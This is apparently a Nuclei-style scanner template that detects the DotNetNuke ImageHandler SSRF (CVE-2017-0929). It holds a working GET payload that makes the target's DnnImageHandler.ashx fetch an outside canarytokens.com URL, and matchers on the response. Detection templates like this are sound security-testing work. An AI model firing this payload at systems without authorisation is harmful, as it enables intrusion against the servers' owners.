id: CVE-2017-0929
info:
  author: medbsq
  name: DotNetNuke ImageHandler SSRF
  severity: Potential
requests:
- headers:
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101
      Firefox/55
  matchers:
  - part: header
    regex:
    - (?m)<html><body>[a-z0-9]+</body></html>
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/DnnImageHandler.ashx?mode=file&url=canarytokens.com/terms/tags/o19w0lhddn1auyrbtnts79n7u/submit.aspx'
